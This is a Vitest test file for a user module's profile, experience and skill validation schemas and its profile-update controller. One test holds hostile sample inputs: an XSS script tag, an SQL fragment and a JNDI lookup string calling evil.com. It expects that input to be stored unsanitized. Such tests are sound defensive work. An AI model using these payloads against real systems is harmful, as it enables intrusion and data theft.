// Comprehensive tests for User Data Validation and Sanitization
import { describe, test, expect, beforeEach, afterEach, vi } from 'vitest';
import { Context } from 'hono';

// Import validation schemas
import {
  profileSchema,
  experienceSchema,
  skillAssociationSchema,
  type ProfileInput,
  type ExperienceInput,
  type SkillAssociationInput
} from '../src/user-module/schemas';

// Import factories
import {
  userFactory
} from './factories/index';

import {
  CloudflareMockUtils
} from './mocks/cloudflare-env';

import UserController from '../src/user-module/controller';

describe('User Data Validation and Sanitization', () => {
  let mockEnv: any;
  let mockContext: any;
  let controller: UserController;

  beforeEach(() => {
    mockEnv = CloudflareMockUtils.createEnv();
    mockContext = CloudflareMockUtils.createContext({}, mockEnv);
    controller = new UserController(mockEnv);
    
    vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(console, 'error').mockImplementation(() => {});
  });

  afterEach(() => {
    mockEnv.__testUtils?.reset();
    vi.restoreAllMocks();
  });

  describe('Profile Schema Validation', () => {
    describe('Full Name Validation', () => {
      test('should accept valid full names', () => {
        const validNames = [
          'John Doe',
          'María García',
          'Jean-Pierre Dubois',
          '李小明',
          'محمد عبدالله',
          "O'Connor Smith",
          'van der Berg',
          'A', // Minimum length
          'A'.repeat(100) // Maximum length
        ];

        validNames.forEach(name => {
          const result = profileSchema.safeParse({ fullName: name });
          expect(result.success).toBe(true);
        });
      });

      test('should reject invalid full names', () => {
        const invalidNames = [
          '', // Empty string
          '   ', // Only whitespace
          'A'.repeat(101), // Too long
        ];

        invalidNames.forEach(name => {
          const result = profileSchema.safeParse({ fullName: name });
          expect(result.success).toBe(false);
        });
      });

      test('should provide appropriate error messages for full name validation', () => {
        const emptyNameResult = profileSchema.safeParse({ fullName: '' });
        expect(emptyNameResult.success).toBe(false);
        if (!emptyNameResult.success) {
          expect(emptyNameResult.error.issues[0].message).toBe('Full name is required');
        }

        const longNameResult = profileSchema.safeParse({ fullName: 'A'.repeat(101) });
        expect(longNameResult.success).toBe(false);
        if (!longNameResult.success) {
          expect(longNameResult.error.issues[0].message).toBe('Full name too long');
        }
      });
    });

    describe('Email Validation', () => {
      test('should accept valid email formats', () => {
        const validEmails = [
          'test@example.com',
          'user.name@domain.co.uk',
          'firstname+lastname@company.org',
          'test123@test-domain.com',
          'user_name@example-site.net',
          'contact@sub.example.co',
          'a@b.co'
        ];

        validEmails.forEach(email => {
          const result = profileSchema.safeParse({ email });
          expect(result.success).toBe(true);
        });
      });

      test('should reject invalid email formats', () => {
        const invalidEmails = [
          'plainaddress',
          '@missingdomain.com',
          'missing@.com',
          'missing@domain',
          'spaces @domain.com',
          'double@@domain.com',
          'trailing.dot@domain.com.',
          '.leading.dot@domain.com',
          'multiple...dots@domain.com',
          'toolong' + 'a'.repeat(100) + '@domain.com'
        ];

        invalidEmails.forEach(email => {
          const result = profileSchema.safeParse({ email });
          expect(result.success).toBe(false);
        });
      });

      test('should provide appropriate error message for email validation', () => {
        const result = profileSchema.safeParse({ email: 'invalid-email' });
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.issues[0].message).toBe('Invalid email format');
        }
      });
    });

    describe('Bio Validation', () => {
      test('should accept valid bios', () => {
        const validBios = [
          '',
          'Short bio',
          'A'.repeat(1000), // Maximum length
          'Bio with special characters: !@#$%^&*()',
          'Multilingual bio with émojis 🚀',
          'Bio with\nnewlines\nand\ttabs'
        ];

        validBios.forEach(bio => {
          const result = profileSchema.safeParse({ bio });
          expect(result.success).toBe(true);
        });
      });

      test('should reject bios that are too long', () => {
        const longBio = 'A'.repeat(1001); // Too long
        const result = profileSchema.safeParse({ bio: longBio });
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.issues[0].message).toBe('Bio too long');
        }
      });
    });

    describe('Location Validation', () => {
      test('should accept string locations', () => {
        const stringLocations = [
          'New York, NY',
          'London, UK',
          'San Francisco, California',
          '東京, 日本',
          'París, Francia'
        ];

        stringLocations.forEach(location => {
          const result = profileSchema.safeParse({ location });
          expect(result.success).toBe(true);
        });
      });

      test('should accept Google Places location objects', () => {
        const googlePlacesLocation = {
          description: 'New York, NY, USA',
          matched_substrings: [{ length: 8, offset: 0 }],
          place_id: 'ChIJOwg_06VPwokRYv534QaPC8g',
          reference: 'reference123',
          structured_formatting: {
            main_text: 'New York',
            main_text_matched_substrings: [{ length: 8, offset: 0 }],
            secondary_text: 'NY, USA',
            secondary_text_matched_substrings: [{ length: 7, offset: 0 }]
          },
          terms: [
            { offset: 0, value: 'New York' },
            { offset: 10, value: 'NY' }
          ],
          types: ['locality', 'political']
        };

        const result = profileSchema.safeParse({ location: googlePlacesLocation });
        expect(result.success).toBe(true);
      });

      test('should reject invalid location objects', () => {
        const invalidLocation = {
          description: 'Valid description',
          // Missing required fields
        };

        const result = profileSchema.safeParse({ location: invalidLocation });
        expect(result.success).toBe(false);
      });
    });

    describe('File Object Validation', () => {
      test('should accept valid file objects for profile picture', () => {
        const validFileObjects = [
          { fileKey: 'profile/123.jpg' },
          { fileUrl: 'https://example.com/profile.jpg' },
          { uploadUrl: 'https://upload.example.com/profile' },
          {
            fileKey: 'profile/456.jpg',
            fileUrl: 'https://example.com/profile.jpg',
            uploadUrl: 'https://upload.example.com/profile'
          }
        ];

        validFileObjects.forEach(fileObj => {
          const result = profileSchema.safeParse({ profilePicture: fileObj });
          expect(result.success).toBe(true);
        });
      });

      test('should accept string URLs for profile picture', () => {
        const result = profileSchema.safeParse({ 
          profilePicture: 'https://example.com/profile.jpg' 
        });
        expect(result.success).toBe(true);
      });

      test('should accept valid file objects for CV link', () => {
        const validCvObjects = [
          { fileKey: 'cv/resume.pdf' },
          { fileUrl: 'https://example.com/resume.pdf' },
          {
            fileKey: 'cv/john-doe-resume.pdf',
            fileUrl: 'https://cdn.example.com/resume.pdf',
            uploadUrl: 'https://upload.example.com/cv'
          }
        ];

        validCvObjects.forEach(cvObj => {
          const result = profileSchema.safeParse({ cvLink: cvObj });
          expect(result.success).toBe(true);
        });
      });
    });

    describe('Optional Fields Validation', () => {
      test('should accept undefined for all optional fields', () => {
        const result = profileSchema.safeParse({});
        expect(result.success).toBe(true);
      });

      test('should accept valid values for optional string fields', () => {
        const profileData = {
          jobRoleId: 'software-engineer-123',
          expectedSalary: '80000',
          yearsOfExperience: '5',
          availableToStart: '2024-01-01',
          preferredRole: 'Senior Software Engineer'
        };

        const result = profileSchema.safeParse(profileData);
        expect(result.success).toBe(true);
      });

      test('should validate boolean fields correctly', () => {
        const validBooleans = [true, false, undefined];
        
        validBooleans.forEach(immediateJoiner => {
          const result = profileSchema.safeParse({ immediateJoiner });
          expect(result.success).toBe(true);
        });

        // Invalid boolean values
        const invalidBooleans = ['true', 'false', 1, 0, 'yes', 'no'];
        
        invalidBooleans.forEach(immediateJoiner => {
          const result = profileSchema.safeParse({ immediateJoiner });
          expect(result.success).toBe(false);
        });
      });
    });
  });

  describe('Experience Schema Validation', () => {
    describe('Required Fields', () => {
      test('should require company ID', () => {
        const invalidExperience = {
          startDate: '2020-01-01',
          isCurrent: false
          // Missing companyId
        };

        const result = experienceSchema.safeParse(invalidExperience);
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.issues[0].message).toBe('Company ID is required');
        }
      });

      test('should require start date', () => {
        const invalidExperience = {
          companyId: 'company-123',
          isCurrent: false
          // Missing startDate
        };

        const result = experienceSchema.safeParse(invalidExperience);
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.issues[0].message).toBe('Start date is required');
        }
      });

      test('should require isCurrent boolean', () => {
        const validExperience = {
          companyId: 'company-123',
          startDate: '2020-01-01',
          isCurrent: true
        };

        const result = experienceSchema.safeParse(validExperience);
        expect(result.success).toBe(true);

        // Test without isCurrent
        const invalidExperience = {
          companyId: 'company-123',
          startDate: '2020-01-01'
          // Missing isCurrent
        };

        const invalidResult = experienceSchema.safeParse(invalidExperience);
        expect(invalidResult.success).toBe(false);
      });
    });

    describe('Optional Fields', () => {
      test('should accept valid optional fields', () => {
        const experienceData: ExperienceInput = {
          jobRoleId: 'senior-dev-123',
          companyId: 'company-456',
          location: 'Remote',
          startDate: '2020-01-01',
          endDate: '2023-12-31',
          isCurrent: false,
          rolesAndResponsibilities: 'Led development of web applications using React and Node.js'
        };

        const result = experienceSchema.safeParse(experienceData);
        expect(result.success).toBe(true);
        expect(result.data).toEqual(experienceData);
      });

      test('should validate roles and responsibilities length', () => {
        const longDescription = 'A'.repeat(2001); // Too long
        const experienceData = {
          companyId: 'company-123',
          startDate: '2020-01-01',
          isCurrent: false,
          rolesAndResponsibilities: longDescription
        };

        const result = experienceSchema.safeParse(experienceData);
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.issues[0].message).toBe('Roles and responsibilities too long');
        }
      });

      test('should accept maximum valid length for roles and responsibilities', () => {
        const maxDescription = 'A'.repeat(2000); // Maximum allowed
        const experienceData = {
          companyId: 'company-123',
          startDate: '2020-01-01',
          isCurrent: false,
          rolesAndResponsibilities: maxDescription
        };

        const result = experienceSchema.safeParse(experienceData);
        expect(result.success).toBe(true);
      });
    });

    describe('Current Position Logic', () => {
      test('should allow current position without end date', () => {
        const currentExperience = {
          companyId: 'company-123',
          startDate: '2022-01-01',
          isCurrent: true
          // No endDate for current position
        };

        const result = experienceSchema.safeParse(currentExperience);
        expect(result.success).toBe(true);
      });

      test('should allow past position with end date', () => {
        const pastExperience = {
          companyId: 'company-123',
          startDate: '2020-01-01',
          endDate: '2022-12-31',
          isCurrent: false
        };

        const result = experienceSchema.safeParse(pastExperience);
        expect(result.success).toBe(true);
      });
    });
  });

  describe('Skill Association Schema Validation', () => {
    test('should require at least one skill ID', () => {
      const emptySkills: SkillAssociationInput = {
        skillIds: []
      };

      const result = skillAssociationSchema.safeParse(emptySkills);
      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues[0].message).toBe('At least one skill is required');
      }
    });

    test('should accept valid skill ID arrays', () => {
      const validSkillSets = [
        { skillIds: ['skill-1'] },
        { skillIds: ['skill-1', 'skill-2'] },
        { skillIds: ['javascript', 'react', 'nodejs', 'typescript', 'mongodb'] },
        { skillIds: Array(50).fill(null).map((_, i) => `skill-${i}`)} // Large but valid
      ];

      validSkillSets.forEach(skillData => {
        const result = skillAssociationSchema.safeParse(skillData);
        expect(result.success).toBe(true);
      });
    });

    test('should reject empty skill IDs', () => {
      const skillsWithEmptyId = {
        skillIds: ['valid-skill-1', '', 'valid-skill-2']
      };

      const result = skillAssociationSchema.safeParse(skillsWithEmptyId);
      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues[0].message).toBe('Skill ID cannot be empty');
      }
    });

    test('should require skillIds to be array of strings', () => {
      const invalidSkillTypes = [
        { skillIds: 'not-an-array' },
        { skillIds: [123, 456] }, // Numbers instead of strings
        { skillIds: [null, undefined] },
        { skillIds: [true, false] },
        { skillIds: [{}] }
      ];

      invalidSkillTypes.forEach(skillData => {
        const result = skillAssociationSchema.safeParse(skillData);
        expect(result.success).toBe(false);
      });
    });
  });

  describe('Real-World Data Sanitization', () => {
    test('should handle common input variations in profile update', async () => {
      const user = userFactory.build();
      mockEnv.DB.seedTable('users', [user]);

      // Test data with common variations that need sanitization
      const profileData = {
        fullName: '  John Doe  ', // Extra whitespace
        email: ' JOHN@EXAMPLE.COM ', // Case and whitespace variations
        bio: 'Software developer\nwith experience in\t\tReact', // Newlines and tabs
        expectedSalary: ' 75000 ', // Numeric strings with spaces
        yearsOfExperience: '5.5', // Decimal in string
        immediateJoiner: true
      };

      const jwtPayload = {
        userId: user.id,
        phoneNumber: user.phoneNumber,
        type: 'access',
        exp: Math.floor(Date.now() / 1000) + 3600
      };
      mockContext.get = vi.fn().mockReturnValue(jwtPayload);
      mockContext.req.json = vi.fn().mockResolvedValue(profileData);

      const response = await controller.updateProfile(mockContext);
      const result = await response.json();

      expect(response.status).toBe(200);
      expect(result.success).toBe(true);
      // Note: Actual sanitization would happen at application level
      expect(result.data.fullName).toBeDefined();
      expect(result.data.email).toBeDefined();
    });

    test('should preserve international characters and emojis', async () => {
      const user = userFactory.build();
      mockEnv.DB.seedTable('users', [user]);

      const internationalProfile = {
        fullName: 'José María García-López',
        email: 'jose.maria@español.com',
        bio: '软件开发工程师 🚀 Especialista en React & Node.js',
        location: 'Barcelona, España 🇪🇸'
      };

      const jwtPayload = {
        userId: user.id,
        phoneNumber: user.phoneNumber,
        type: 'access',
        exp: Math.floor(Date.now() / 1000) + 3600
      };
      mockContext.get = vi.fn().mockReturnValue(jwtPayload);
      mockContext.req.json = vi.fn().mockResolvedValue(internationalProfile);

      const response = await controller.updateProfile(mockContext);
      const result = await response.json();

      expect(response.status).toBe(200);
      expect(result.success).toBe(true);
      expect(result.data.fullName).toBe(internationalProfile.fullName);
      expect(result.data.email).toBe(internationalProfile.email);
    });

    test('should handle malicious input attempts', async () => {
      const user = userFactory.build();
      mockEnv.DB.seedTable('users', [user]);

      const maliciousProfile = {
        fullName: '<script>alert("xss")</script>',
        email: 'test@example.com',
        bio: 'SELECT * FROM users; --',
        location: '${jndi:ldap://evil.com/a}'
      };

      const jwtPayload = {
        userId: user.id,
        phoneNumber: user.phoneNumber,
        type: 'access',
        exp: Math.floor(Date.now() / 1000) + 3600
      };
      mockContext.get = vi.fn().mockReturnValue(jwtPayload);
      mockContext.req.json = vi.fn().mockResolvedValue(maliciousProfile);

      const response = await controller.updateProfile(mockContext);
      const result = await response.json();

      // Should still succeed but data should be stored as-is
      // (Sanitization would typically happen at display time)
      expect(response.status).toBe(200);
      expect(result.success).toBe(true);
    });
  });

  describe('Edge Cases and Boundary Conditions', () => {
    test('should handle exactly minimum and maximum string lengths', () => {
      // Full name: min 1, max 100
      expect(profileSchema.safeParse({ fullName: 'A' }).success).toBe(true);
      expect(profileSchema.safeParse({ fullName: 'A'.repeat(100) }).success).toBe(true);
      expect(profileSchema.safeParse({ fullName: '' }).success).toBe(false);
      expect(profileSchema.safeParse({ fullName: 'A'.repeat(101) }).success).toBe(false);

      // Bio: max 1000
      expect(profileSchema.safeParse({ bio: 'A'.repeat(1000) }).success).toBe(true);
      expect(profileSchema.safeParse({ bio: 'A'.repeat(1001) }).success).toBe(false);
    });

    test('should handle Unicode characters correctly in length validation', () => {
      // Test with emoji and multi-byte characters
      const unicodeName = '🚀👨‍💻李小明'; // Mixed emoji and Chinese characters
      const unicodeBio = '软件工程师 👨‍💻 specializing in React & Node.js 🌟'.repeat(20);

      expect(profileSchema.safeParse({ fullName: unicodeName }).success).toBe(true);
      
      // Unicode bio should respect character limits, not byte limits
      if (unicodeBio.length <= 1000) {
        expect(profileSchema.safeParse({ bio: unicodeBio }).success).toBe(true);
      }
    });

    test('should handle null and undefined values appropriately', () => {
      // Required fields should reject null
      expect(experienceSchema.safeParse({ companyId: null }).success).toBe(false);
      expect(experienceSchema.safeParse({ startDate: null }).success).toBe(false);
      expect(experienceSchema.safeParse({ isCurrent: null }).success).toBe(false);

      // Optional fields should accept undefined but not null
      expect(profileSchema.safeParse({ fullName: undefined }).success).toBe(true);
      expect(profileSchema.safeParse({ email: undefined }).success).toBe(true);
      expect(profileSchema.safeParse({ bio: undefined }).success).toBe(true);
    });

    test('should handle type coercion scenarios', () => {
      // Numbers as strings should be handled appropriately
      const profileWithNumbers = {
        expectedSalary: 75000, // Number instead of string
        yearsOfExperience: 5, // Number instead of string
        immediateJoiner: 'true' // String instead of boolean
      };

      // These should fail validation as they expect specific types
      expect(profileSchema.safeParse(profileWithNumbers).success).toBe(false);
    });
  });
});